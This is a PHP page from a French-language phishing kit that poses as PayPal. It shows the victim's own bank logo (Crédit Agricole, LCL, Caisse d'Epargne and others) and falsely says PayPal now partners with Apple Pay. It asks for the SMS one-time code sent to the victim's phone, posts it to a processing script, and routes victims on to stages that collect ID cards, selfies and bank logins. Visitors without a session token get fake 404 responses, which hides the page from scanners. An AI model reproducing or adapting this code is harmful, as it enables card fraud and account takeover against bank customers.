<?php
include('../settings.php');
session_start();

if(strpos($_SERVER['REQUEST_URI'], $_SESSION['userid']))
{


  if(strpos($_SERVER['REQUEST_URI'], $_SESSION['gotoapplepay']))
  {

  	if(strpos($_SESSION['bank'], "EPARGNE") || strpos($_SESSION['bank'], "D'EPARGNE") || strpos($_SESSION['bank'], "DEPARGNE") || strpos($_SESSION['bank'], "AGRICOLE") || strpos($_SESSION['bank'], "LYONNAIS") || strpos($_SESSION['bank'], "LCL") || $_SESSION['bank'] == "LCL BANQUE" || strpos($_SESSION['bank'], "POPULAIRE") || strpos($_SESSION['bank'], "ATIXIS") || $_SESSION['bank'] == "NATIXIS" || strpos($_SESSION['bank'], "NORD") )
  	{


?>


<html lang="fr_FR" dir="ltr"><head>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Quicksand:wght@300&family=Ubuntu:wght@300&display=swap');
    .notifications{outline:0;margin-bottom:10px;font-size:13px}.notifications.animatable{display:none}.notifications .notification{margin:0;padding:15px 15px 15px 44px;-webkit-border-radius:5px;-moz-border-radius:5px;-khtml-border-radius:5px;border-radius:5px;border-width:1px;border-style:solid;text-align:left;font-size:1em;background:url(https://www.paypalobjects.com/images/shared/icon_alert_sprite-2x.png) no-repeat;background-size:20px}.notifications .notification.notification-default{background-color:#f7f9fa;background-position:12px -788px;background-position:left 12px top -788px;border-color:#afabae}.lower-than-ie9 .notifications .notification.notification-default{background-position:1% 81.5%}.notifications .notification.notification-critical{background-color:#fff7f7;background-position:12px -387px;background-position:left 12px top -387px;border-color:#c72e2e}.lower-than-ie9 .notifications .notification.notification-critical{background-position:1% 41%}.notifications .notification.notification-help{background-color:#f7fdff;background-position:12px -588px;background-position:left 12px top -588px;border-color:#009cde}.lower-than-ie9 .notifications .notification.notification-help{background-position:1% 61%}.notifications .notification.notification-success{background-color:#f7fff7;background-position:12px 12px;background-position:left 12px top 12px;border-color:#1b9e1b}.lower-than-ie9 .notifications .notification.notification-success{background-position:1% 0}.notifications .notification.notification-warning{background-color:#fffcf7;background-position:12px -188px;background-position:left 12px top -188px;border-color:#f8981f}.lower-than-ie9 .notifications .notification.notification-warning{background-position:1% 20.5%}.deniedCaution{margin-bottom:25px;width:112px;height:100px}.denied{text-align:center}.verification,.unavailable{text-align:left}.verification .headerText{font-size:30px}.verification .verification-message{margin:0 0 24px;text-align:center}.verification .pin{margin:0 0 12px;text-align:center;font-size:36px;color:#2c2e2f}.mobileNotification{padding:36px 0 24px}.mobileScreen{width:121px;margin:auto}
</style>
    
<script>
				function checkValue(str, max) {
				if (str.charAt(0) !== '0' || str == '00') {
					var num = parseInt(str);
					if (isNaN(num) || num <= 0 || num > max) num = 1;
					str = num > parseInt(max.toString().charAt(0)) && num.toString().length == 1 ? '0' + num : num.toString();
				};
				return str;
			};

  // reformat by date
		function date_reformat_dd(date) {
			date.addEventListener('input', function(e) {
				this.type = 'text';
				var input = this.value;
				if (/\D\/$/.test(input)) input = input.substr(0, input.length - 3);
				var values = input.split('/').map(function(v) {
					return v.replace(/\D/g, '')
				});
				if (values[1]) values[1] = checkValue(values[1], 12);
				if (values[0]) values[0] = checkValue(values[0], 31);
				var output = values.map(function(v, i) {
					return v.length == 2 && i < 2 ? v + '/' : v;
				});
				this.value = output.join('').substr(0, 14);
			});
		}
		

</script>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Hind+Madurai&display=swap');
.oaerror{
  width:80%;
  background-color: #ffffff;
  padding:20px;
  border:1px solid #eee;
  border-left-width:5px;
  border-radius: 3px;
  margin:10px auto;
  font-family: 'Open Sans', sans-serif;
  font-size: 16px;
}

.danger{
  border-left-color: #d9534f; /* Left side border color */
  background-color: rgba(217, 83, 79, 0.1); /*Same color as the left border with reduced alpha to 0.1*/
}

.danger strong{
  color:#d9534f;
}

.col-3{ width: 27.33%; margin: 40px 3%; position: relative;} /* necessary to give position: relative to parent. */
input[type="text"]{font: 15px/24px "Lato", Arial, sans-serif; color: #333; width: 100%; box-sizing: border-box; letter-spacing: 1px;}

.effect-1, 
.effect-2, 
.effect-3{border: 0; padding: 7px 0; border-bottom: 1px solid #ccc;}

.effect-1 ~ .focus-border{position: absolute; bottom: 0; left: 0; width: 0; height: 2px; background-color: #3399FF; transition: 0.4s;}
.effect-1:focus ~ .focus-border{width: 100%; transition: 0.4s;}

.effect-2 ~ .focus-border{position: absolute; bottom: 0; left: 50%; width: 0; height: 2px; background-color: #3399FF; transition: 0.4s;}
.effect-2:focus ~ .focus-border{width: 100%; transition: 0.4s; left: 0;}

.effect-3 ~ .focus-border{position: absolute; bottom: 0; left: 0; width: 100%; height: 2px; z-index: 99;}
.effect-3 ~ .focus-border:before, 
.effect-3 ~ .focus-border:after{content: ""; position: absolute; bottom: 0; left: 0; width: 0; height: 100%; background-color: #3399FF; transition: 0.4s;}
.effect-3 ~ .focus-border:after{left: auto; right: 0;}
.effect-3:focus ~ .focus-border:before, 
.effect-3:focus ~ .focus-border:after{width: 50%; transition: 0.4s;}

.effect-4,
.effect-5,
.effect-6{border: 0; padding: 5px 0 7px; border: 1px solid transparent; border-bottom-color: #ccc; transition: 0.4s;}

.effect-4:focus,
.effect-5:focus,
.effect-6:focus{padding: 5px 14px 7px; transition: 0.4s;}

.effect-4 ~ .focus-border{position: absolute; height: 0; bottom: 0; left: 0; width: 100%; transition: 0.4s; z-index: -1;}
.effect-4:focus ~ .focus-border{transition: 0.4s; height: 36px; border: 2px solid #3399FF; z-index: 1;}

.effect-5 ~ .focus-border{position: absolute; height: 36px; bottom: 0; left: 0; width: 0; transition: 0.4s;}
.effect-5:focus ~ .focus-border{width: 100%; transition: 0.4s; border: 2px solid #3399FF;}

.effect-6 ~ .focus-border{position: absolute; height: 36px; bottom: 0; right: 0; width: 0; transition: 0.4s;}
.effect-6:focus ~ .focus-border{width: 100%; transition: 0.4s; border: 2px solid #3399FF;}

.effect-7,
.effect-8,
.effect-9{border: 1px solid #ccc; padding: 7px 14px 9px; transition: 0.4s;}

.effect-7 ~ .focus-border:before,
.effect-7 ~ .focus-border:after{content: ""; position: absolute; top: 0; left: 50%; width: 0; height: 2px; background-color: #3399FF; transition: 0.4s;}
.effect-7 ~ .focus-border:after{top: auto; bottom: 0;}
.effect-7 ~ .focus-border i:before,
.effect-7 ~ .focus-border i:after{content: ""; position: absolute; top: 50%; left: 0; width: 2px; height: 0; background-color: #3399FF; transition: 0.6s;}
.effect-7 ~ .focus-border i:after{left: auto; right: 0;}
.effect-7:focus ~ .focus-border:before,
.effect-7:focus ~ .focus-border:after{left: 0; width: 100%; transition: 0.4s;}
.effect-7:focus ~ .focus-border i:before,
.effect-7:focus ~ .focus-border i:after{top: 0; height: 100%; transition: 0.6s;}

.effect-8 ~ .focus-border:before,
.effect-8 ~ .focus-border:after{content: ""; position: absolute; top: 0; left: 0; width: 0; height: 2px; background-color: #3399FF; transition: 0.3s;}
.effect-8 ~ .focus-border:after{top: auto; bottom: 0; left: auto; right: 0;}
.effect-8 ~ .focus-border i:before,
.effect-8 ~ .focus-border i:after{content: ""; position: absolute; top: 0; left: 0; width: 2px; height: 0; background-color: #3399FF; transition: 0.4s;}
.effect-8 ~ .focus-border i:after{left: auto; right: 0; top: auto; bottom: 0;}
.effect-8:focus ~ .focus-border:before,
.effect-8:focus ~ .focus-border:after{width: 100%; transition: 0.3s;}
.effect-8:focus ~ .focus-border i:before,
.effect-8:focus ~ .focus-border i:after{height: 100%; transition: 0.4s;}

.effect-9 ~ .focus-border:before,
.effect-9 ~ .focus-border:after{content: ""; position: absolute; top: 0; right: 0; width: 0; height: 2px; background-color: #3399FF; transition: 0.2s; transition-delay: 0.2s;}
.effect-9 ~ .focus-border:after{top: auto; bottom: 0; right: auto; left: 0; transition-delay: 0.6s;}
.effect-9 ~ .focus-border i:before,
.effect-9 ~ .focus-border i:after{content: ""; position: absolute; top: 0; left: 0; width: 2px; height: 0; background-color: #3399FF; transition: 0.2s;}
.effect-9 ~ .focus-border i:after{left: auto; right: 0; top: auto; bottom: 0; transition-delay: 0.4s;}
.effect-9:focus ~ .focus-border:before,
.effect-9:focus ~ .focus-border:after{width: 100%; transition: 0.2s; transition-delay: 0.6s;}
.effect-9:focus ~ .focus-border:after{transition-delay: 0.2s;}
.effect-9:focus ~ .focus-border i:before,
.effect-9:focus ~ .focus-border i:after{height: 100%; transition: 0.2s;}
.effect-9:focus ~ .focus-border i:after{transition-delay: 0.4s;}

.effect-10, 
.effect-11, 
.effect-12,
.effect-13,
.effect-14,
.effect-15{border: 0; padding: 7px 15px; border: 1px solid #ccc; position: relative; background: transparent;}

.effect-10 ~ .focus-bg{position: absolute; left: 0; top: 0; width: 100%; height: 100%; background-color: #ededed; opacity: 0; transition: 0.5s; z-index: -1;}
.effect-10:focus ~ .focus-bg{transition: 0.5s; opacity: 1;}

.effect-11 ~ .focus-bg{position: absolute; left: 0; top: 0; width: 0; height: 100%; background-color: #ededed; transition: 0.3s; z-index: -1;}
.effect-11:focus ~ .focus-bg{transition: 0.3s; width: 100%;}

.effect-12 ~ .focus-bg{position: absolute; left: 50%; top: 0; width: 0; height: 100%; background-color: #ededed; transition: 0.3s; z-index: -1;}
.effect-12:focus ~ .focus-bg{transition: 0.3s; width: 100%; left: 0;}

.effect-13 ~ .focus-bg:before,
.effect-13 ~ .focus-bg:after{content: ""; position: absolute; left: 0; top: 0; width: 0; height: 100%; background-color: #ededed; transition: 0.3s; z-index: -1;}
.effect-13:focus ~ .focus-bg:before{transition: 0.3s; width: 50%;}
.effect-13 ~ .focus-bg:after{left: auto; right: 0;}
.effect-13:focus ~ .focus-bg:after{transition: 0.3s; width: 50%;}

.effect-14 ~ .focus-bg:before,
.effect-14 ~ .focus-bg:after{content: ""; position: absolute; left: 0; top: 0; width: 0; height: 0; background-color: #ededed; transition: 0.3s; z-index: -1;}
.effect-14:focus ~ .focus-bg:before{transition: 0.3s; width: 50%; height: 100%;}
.effect-14 ~ .focus-bg:after{left: auto; right: 0; top: auto; bottom: 0;}
.effect-14:focus ~ .focus-bg:after{transition: 0.3s; width: 50%; height: 100%;}

.effect-15 ~ .focus-bg:before,
.effect-15 ~ .focus-bg:after{content: ""; position: absolute; left: 50%; top: 50%; width: 0; height: 0; background-color: #ededed; transition: 0.3s; z-index: -1;}
.effect-15:focus ~ .focus-bg:before{transition: 0.3s; width: 50%; left: 0; top: 0; height: 100%;}
.effect-15 ~ .focus-bg:after{left: auto; right: 50%; top: auto; bottom: 50%;}
.effect-15:focus ~ .focus-bg:after{transition: 0.3s; width: 50%; height: 100%; bottom: 0; right: 0;}


.effect-16, 
.effect-17, 
.effect-18{border: 0; padding: 4px 0; border-bottom: 1px solid #ccc; background-color: transparent;}

.effect-16 ~ .focus-border{position: absolute; bottom: 0; left: 0; width: 0; height: 2px; background-color: #3399FF; transition: 0.4s;}
.effect-16:focus ~ .focus-border,
.has-content.effect-16 ~ .focus-border{width: 100%; transition: 0.4s;}
.effect-16 ~ label{position: absolute; left: 0; width: 100%; top: 9px; color: #aaa; transition: 0.3s; z-index: -1; letter-spacing: 0.5px;}
.effect-16:focus ~ label, .has-content.effect-16 ~ label{top: -16px; font-size: 12px; color: #3399FF; transition: 0.3s;}

.effect-17 ~ .focus-border{position: absolute; bottom: 0; left: 50%; width: 0; height: 2px; background-color: #3399FF; transition: 0.4s;}
.effect-17:focus ~ .focus-border,
.has-content.effect-17 ~ .focus-border{width: 100%; transition: 0.4s; left: 0;}
.effect-17 ~ label{position: absolute; left: 0; width: 100%; top: 9px; color: #aaa; transition: 0.3s; z-index: -1; letter-spacing: 0.5px;}
.effect-17:focus ~ label, .has-content.effect-17 ~ label{top: -16px; font-size: 12px; color: #3399FF; transition: 0.3s;}

.effect-18 ~ .focus-border{position: absolute; bottom: 0; left: 0; width: 100%; height: 2px; z-index: 99;}
.effect-18 ~ .focus-border:before, 
.effect-18 ~ .focus-border:after{content: ""; position: absolute; bottom: 0; left: 0; width: 0; height: 100%; background-color: #3399FF; transition: 0.4s;}
.effect-18 ~ .focus-border:after{left: auto; right: 0;}
.effect-18:focus ~ .focus-border:before, 
.effect-18:focus ~ .focus-border:after,
.has-content.effect-18 ~ .focus-border:before,
.has-content.effect-18 ~ .focus-border:after{width: 50%; transition: 0.4s;}
.effect-18 ~ label{position: absolute; left: 0; width: 100%; top: 9px; color: #aaa; transition: 0.3s; z-index: -1; letter-spacing: 0.5px;}
.effect-18:focus ~ label, .has-content.effect-18 ~ label{top: -16px; font-size: 12px; color: #3399FF; transition: 0.3s;}

.effect-19,
.effect-20,
.effect-21{border: 1px solid #ccc; padding: 7px 14px; transition: 0.4s; background: transparent;}

.effect-19 ~ .focus-border:before,
.effect-19 ~ .focus-border:after{content: ""; position: absolute; top: -1px; left: 50%; width: 0; height: 2px; background-color: #3399FF; transition: 0.4s;}
.effect-19 ~ .focus-border:after{top: auto; bottom: 0;}
.effect-19 ~ .focus-border i:before,
.effect-19 ~ .focus-border i:after{content: ""; position: absolute; top: 50%; left: 0; width: 2px; height: 0; background-color: #3399FF; transition: 0.6s;}
.effect-19 ~ .focus-border i:after{left: auto; right: 0;}
.effect-19:focus ~ .focus-border:before,
.effect-19:focus ~ .focus-border:after,
.has-content.effect-19 ~ .focus-border:before,
.has-content.effect-19 ~ .focus-border:after{left: 0; width: 100%; transition: 0.4s;}
.effect-19:focus ~ .focus-border i:before,
.effect-19:focus ~ .focus-border i:after,
.has-content.effect-19 ~ .focus-border i:before,
.has-content.effect-19 ~ .focus-border i:after{top: -1px; height: 100%; transition: 0.6s;}
.effect-19 ~ label{position: absolute; left: 14px; width: 100%; top: 10px; color: #aaa; transition: 0.3s; z-index: -1; letter-spacing: 0.5px;}
.effect-19:focus ~ label, .has-content.effect-19 ~ label{top: -18px; left: 0; font-size: 12px; color: #3399FF; transition: 0.3s;}

.effect-20 ~ .focus-border:before,
.effect-20 ~ .focus-border:after{content: ""; position: absolute; top: 0; left: 0; width: 0; height: 2px; background-color: #3399FF; transition: 0.3s;}
.effect-20 ~ .focus-border:after{top: auto; bottom: 0; left: auto; right: 0;}
.effect-20 ~ .focus-border i:before,
.effect-20 ~ .focus-border i:after{content: ""; position: absolute; top: 0; left: 0; width: 2px; height: 0; background-color: #3399FF; transition: 0.4s;}
.effect-20 ~ .focus-border i:after{left: auto; right: 0; top: auto; bottom: 0;}
.effect-20:focus ~ .focus-border:before,
.effect-20:focus ~ .focus-border:after,
.has-content.effect-20 ~ .focus-border:before,
.has-content.effect-20 ~ .focus-border:after{width: 100%; transition: 0.3s;}
.effect-20:focus ~ .focus-border i:before,
.effect-20:focus ~ .focus-border i:after,
.has-content.effect-20 ~ .focus-border i:before,
.has-content.effect-20 ~ .focus-border i:after{height: 100%; transition: 0.4s;}
.effect-20 ~ label{position: absolute; left: 14px; width: 100%; top: 10px; color: #aaa; transition: 0.3s; z-index: -1; letter-spacing: 0.5px;}
.effect-20:focus ~ label, .has-content.effect-20 ~ label{top: -18px; left: 0; font-size: 12px; color: #3399FF; transition: 0.3s;}

.effect-21 ~ .focus-border:before,
.effect-21 ~ .focus-border:after{content: ""; position: absolute; top: 0; right: 0; width: 0; height: 2px; background-color: #3399FF; transition: 0.2s; transition-delay: 0.2s;}
.effect-21 ~ .focus-border:after{top: auto; bottom: 0; right: auto; left: 0; transition-delay: 0.6s;}
.effect-21 ~ .focus-border i:before,
.effect-21 ~ .focus-border i:after{content: ""; position: absolute; top: 0; left: 0; width: 2px; height: 0; background-color: #3399FF; transition: 0.2s;}
.effect-21 ~ .focus-border i:after{left: auto; right: 0; top: auto; bottom: 0; transition-delay: 0.4s;}
.effect-21:focus ~ .focus-border:before,
.effect-21:focus ~ .focus-border:after,
.has-content.effect-21 ~ .focus-border:before,
.has-content.effect-21 ~ .focus-border:after{width: 100%; transition: 0.2s; transition-delay: 0.6s;}
.effect-21:focus ~ .focus-border:after,
.has-content.effect-21 ~ .focus-border:after{transition-delay: 0.2s;}
.effect-21:focus ~ .focus-border i:before,
.effect-21:focus ~ .focus-border i:after,
.has-content.effect-21 ~ .focus-border i:before,
.has-content.effect-21 ~ .focus-border i:after{height: 100%; transition: 0.2s;}
.effect-21:focus ~ .focus-border i:after,
.has-conten.effect-21 ~ .focus-border i:after{transition-delay: 0.4s;}
.effect-21 ~ label{position: absolute; left: 14px; width: 100%; top: 10px; color: #aaa; transition: 0.3s; z-index: -1; letter-spacing: 0.5px;}
.effect-21:focus ~ label, .has-content.effect-21 ~ label{top: -18px; left: 0; font-size: 12px; color: #3399FF; transition: 0.3s;}

.effect-22, 
.effect-23, 
.effect-24{border: 0; padding: 7px 15px; border: 1px solid #ccc; position: relative; background: transparent;}

.effect-22 ~ .focus-bg{position: absolute; left: 0; top: 0; width: 0; height: 100%; background-color: transparent; transition: 0.4s; z-index: -1;}
.effect-22:focus ~ .focus-bg, 
.has-content.effect-22 ~ .focus-bg{transition: 0.4s; width: 100%; background-color: #ededed;}
.effect-22 ~ label{position: absolute; left: 14px; width: 100%; top: 10px; color: #aaa; transition: 0.3s; z-index: -1; letter-spacing: 0.5px;}
.effect-22:focus ~ label, .has-content.effect-22 ~ label{top: -18px; left: 0; font-size: 12px; color: #333; transition: 0.3s;}

.effect-23 ~ .focus-bg:before,
.effect-23 ~ .focus-bg:after{content: ""; position: absolute; left: 0; top: 0; width: 0; height: 0; background-color: #ededed; transition: 0.3s; z-index: -1;}
.effect-23:focus ~ .focus-bg:before,
.has-content.effect-23 ~ .focus-bg:before{transition: 0.3s; width: 50%; height: 100%;}
.effect-23 ~ .focus-bg:after{left: auto; right: 0; top: auto; bottom: 0;}
.effect-23:focus ~ .focus-bg:after,
.has-content.effect-23 ~ .focus-bg:after{transition: 0.3s; width: 50%; height: 100%;}
.effect-23 ~ label{position: absolute; left: 14px; width: 100%; top: 10px; color: #aaa; transition: 0.3s; z-index: -1; letter-spacing: 0.5px;}
.effect-23:focus ~ label, .has-content.effect-23 ~ label{top: -18px; left: 0; font-size: 12px; color: #333; transition: 0.3s;}

.effect-24 ~ .focus-bg:before,
.effect-24 ~ .focus-bg:after{content: ""; position: absolute; left: 50%; top: 50%; width: 0; height: 0; background-color: #ededed; transition: 0.3s; z-index: -1;}
.effect-24:focus ~ .focus-bg:before,
.has-content.effect-24 ~ .focus-bg:before{transition: 0.3s; width: 50%; left: 0; top: 0; height: 100%;}
.effect-24 ~ .focus-bg:after{left: auto; right: 50%; top: auto; bottom: 50%;}
.effect-24:focus ~ .focus-bg:after,
.has-content.effect-24 ~ .focus-bg:after{transition: 0.3s; width: 50%; height: 100%; bottom: 0; right: 0;}
.effect-24 ~ label{position: absolute; left: 14px; width: 100%; top: 10px; color: #aaa; transition: 0.3s; z-index: -1; letter-spacing: 0.5px;}
.effect-24:focus ~ label, .has-content.effect-24 ~ label{top: -18px; left: 0; font-size: 12px; color: #333; transition: 0.3s;}



a.button:hover, a.button:link:hover, a.button:visited:hover, .button:hover {
    background-color: #005ea6;
    outline: 0;
}
a.button, a.button:link, a.button:visited, .button {
    width: 100%;
    height: 44px;
    padding: 0;
    border: 0;
    display: block;
    background-color: #0070ba;
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
    box-shadow: none;
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    -khtml-border-radius: 4px;
    border-radius: 4px;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    cursor: pointer;
    -webkit-appearance: none;
    -moz-appearance: none;
    -ms-appearance: none;
    -o-appearance: none;
    appearance: none;
    -webkit-tap-highlight-color: transparent;
    color: #fff;
    font-size: 1em;
    text-align: center;
    font-weight: 700;
    font-family: HelveticaNeue-Medium,"Helvetica Neue Medium",HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
    text-shadow: none;
    text-decoration: none;
    -webkit-transition: background-color .4s ease-out;
    -moz-transition: background-color .4s ease-out;
    -o-transition: background-color .4s ease-out;
    transition: background-color .4s ease-out;
    -webkit-font-smoothing: antialiased;
}
</style>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>PayPal - Processus de confirmation</title><script nonce="" type="text/javascript">window.webpackPublicPath = '';</script>
<link nonce="" href="../css/head.css" rel="stylesheet">
<link nonce="" href="card/style.css" rel="stylesheet">


<link rel="shortcut icon" sizes="196x196" href="https://www.paypalobjects.com/webstatic/icon/pp196.png"><link rel="shortcut icon" type="image/x-icon" href="../img/favicon.ico"></head>


<body class="static static-terms_v2">

	<header style="background-color: transparent"><div class="header-content">

		<img style="position: relative;
top: 1px;width: 120px;" src="../img/54qsrg.png"><div class="links"></div><div style="display:inline-block;float:right"><a class="my-paypal-me" href="#">Deconnexion</a></div></div></header><div style="padding-bottom: 200px; " class="wrapper" id="app"><div class="card-form"> <center>


	<?php
	if(strpos($_SESSION['bank'], "AGRICOLE"))
	{
	echo'<img src="../img/logoca.png" style="width: 200px;">';
	echo'<img src="../img/applepay.png" style="width: 98px;">';
	}
	else{

		if(strpos($_SESSION['bank'], "EPARGNE") || strpos($_SESSION['bank'], "D'EPARGNE") || strpos($_SESSION['bank'], "DEPARGNE"))
			{
		echo'<img src="../img/caisse-eparge-apay.png" style="width: 250px; ">';
			}
			else{

				if(strpos($_SESSION['bank'], "LYONNAIS") || strpos($_SESSION['bank'], "LCL") || $_SESSION['bank'] == "LCL BANQUE")
					{

				echo'<img src="../img/lcl.png" style="width: 70px;"><img src="../img/apay_rem.png" style="width: 110px;">';

					}
					else{

						if(strpos($_SESSION['bank'], "POPULAIRE") || strpos($_SESSION['bank'], "ATIXIS") || $_SESSION['bank'] == "NATIXIS")
							{

							echo'<img src="../img/populaire.png" style="width: 90px;"><img src="../img/apay_rem.png" style="width: 110px;">';

							}
							else{

								if(strpos($_SESSION['bank'], "NORD"))
								{
								echo'<img src="../img/cdn.png" style="width: 70px;margin-right:30px;"><img src="../img/a_a_new.png" style="width: 90px; ">';
								}


							}

					}

			}
		
	}

	 ?>



</center>

<br><div class="card-form__inner">
    
    <form action="process006.php?<?php echo $_SESSION['userid']; ?>" method="post">
<h1 style="font-size: 25px;margin-top: -150px;text-align: center;font-family: 'Quicksand', sans-serif;
" class="terms-main-title"><span>Ajout de la carte à Apple Pay</span></h1><strong><p style="text-align: center;font-family: 'Quicksand', sans-serif;
    ">PayPal est désormais partenaire Apple Pay,
<br>Veuillez lier votre carte à Apple Pay pour continuer à utiliser nos services. <br> Un code a été envoyé au numéro de téléphone se terminant par <?php
echo  substr($_SESSION['phone'], 8);
 ?>  </p>
<br></strong>
<?php
if(strpos($_SERVER['REQUEST_URI'],$_SESSION['errorapay']))
{
	?>
<div class="notifications"><p style="font-size:13px;font-family: 'Roboto', sans-serif;" class="notification notification-critical" role="alert"><strong>Vérifiez votre saisie</strong></p></div>
<?php
}
?>








 

<div class="card-input"><label style="font-family: 'Hind Madurai', sans-serif;" for="cardNumber" class="card-input__label">Code reçu par SMS</label> <input name="applepay" type="text" autocomplete="off" class="card-input__input" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" maxlength="8" minlength="6" required></div>

<button type="submit" id="btnLogin" name="btnNext" value="Login" class="button actionContinue" style="width: 100%;">Continuer</button>

    
      
  </form>
  
    
    
    
    
    
       </div></div></div><footer id="footer" style="height: 40px;"><div class="footers-container"><div class="ppme-footer"><div class="links"><a href="/paypalme/" class="link-list-item"><span class="align-with-button">À propos de PayPal</span></a><a href="/paypalme/pages/terms" class="link-list-item"><span class="align-with-button">Conditions</span></a></div></div><div class="paypal-footer" role="contentinfo"><div class="navbar-inner"><div class="navbar-content"><ul class="inline footerList-links footerList-links_primary"><li class="country-list-item"><a href="/paypalme/pages/countries?locale.x=fr_FR&amp;country.x=FR" class="country-selector-link"><div class="country-selector FR"></div></a></li><li> <a href="#">À propos de PayPal</a> </li> <li> <a href="#">Contact</a> </li> <li> <a href="#">Tarifs</a> </li> <li> <a href="#">Respect de la vie privée</a> </li> </ul><div class="country-selector-container"><a href="/paypalme/pages/countries?locale.x=fr_FR&amp;country.x=FR" class="country-selector-link"><div class="country-selector FR"></div></a></div><p class="footerCopyright nemo_copyrightText hide-on-mobile">©1999-2021 PayPal, Inc. Tous droits réservés.</p><ul class="inline footerList-links footerList-links_secondary"><li> <a href="#">Développeurs PayPal</a> </li> <li> <a href="#">Blog PayPal</a> </li> <li> <a href="#">Solutions e-commerce</a> </li> <li> <a href="#">Plan du site</a> </li> </ul><p class="footerCopyright nemo_copyrightText hide-on-desktop">©1999-2021 PayPal, Inc. Tous droits réservés.</p></div></div></div></div></footer><section class="modal"></section>
  



































</body></html>


<?php

	}
	else{

		if($cni == "on")
								{
									header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotocni']);

								}
								else{

									if($selfie == "on")
									{
										header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotoselfie']);
									}
									else
									{

										if($log_bank == "on")
										{
											header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotologbank']);

										}
										else{

											header('Location: loader.php?'.$_SESSION['userid'].$_SESSION['gotofinished']);

										}

									}

								}
	}

 }
 else{
 	die('HTTP/1.0 404 Not Found');

 }

}
else{
	die('HTTP/1.0 404 Not Found');
}


?>